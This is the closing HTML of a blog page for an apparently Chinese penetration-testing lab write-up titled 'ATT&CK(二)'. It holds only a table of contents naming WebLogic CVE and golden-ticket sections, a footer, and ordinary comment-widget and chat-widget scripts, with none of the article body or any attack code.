fa-fw"></i> 2022-08-30</div><div class="title">ATT&amp;CK(一)</div></div></a></div><div><a href="/XSS/XSS/XSS/" title="XSS"><img class="cover" src="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">XSS</div></div></a></div><div><a href="/vulnhub/vulnhub/vulnhub%E9%9D%B6%E5%9C%BA/" title="LordOfTheRoot_1.0.1"><img class="cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">LordOfTheRoot_1.0.1</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ATT-amp-CK-%E4%BA%8C"><span class="toc-number">1.</span> <span class="toc-text">ATT&amp;CK(二)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91"><span class="toc-number">1.3.</span> <span class="toc-text">外网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-SSRF"><span class="toc-number">1.3.1.</span> <span class="toc-text">weblogic SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">简单测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-CVE-2019-2725"><span class="toc-number">1.3.2.</span> <span class="toc-text">weblogic  CVE-2019-2725</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-CVE-2017-10271"><span class="toc-number">1.3.3.</span> <span class="toc-text">weblogic CVE-2017-10271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CVE-2019-2725%E5%86%99shell"><span class="toc-number">1.3.4.</span> <span class="toc-text">利用CVE-2019-2725写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">1.4.</span> <span class="toc-text">内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.5.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">黄金票据利用</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91/ATT&CK(%E4%BA%8C)/'
+    this.page.identifier = '/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91/ATT&CK(%E4%BA%8C)/'
+    this.page.title = 'ATT&CK(二)'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
